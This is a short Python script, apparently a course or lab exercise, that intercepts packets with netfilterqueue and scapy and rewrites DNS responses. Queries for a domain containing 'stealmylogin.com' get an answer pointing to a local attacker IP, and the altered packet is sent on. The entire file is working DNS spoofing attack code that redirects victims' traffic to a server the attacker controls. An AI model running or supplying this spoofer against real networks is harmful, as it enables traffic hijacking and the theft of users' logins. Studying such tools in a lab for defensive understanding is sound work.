#!/user/bin/env python
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):  # check if the packet has DNS Response
        qname = scapy_packet[scapy.DNSQR].qname
        if "stealmylogin.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.190.140")
            scapy_packet[scapy.DNS].an = answer  # .an target the answer "\an" inside a packet
            scapy_packet[scapy.DNS].ancount = 1

            # Delete packet's len & checksum to let scapy manage them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()  # forward the packet to its destination


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # queue number % callback function
queue.run()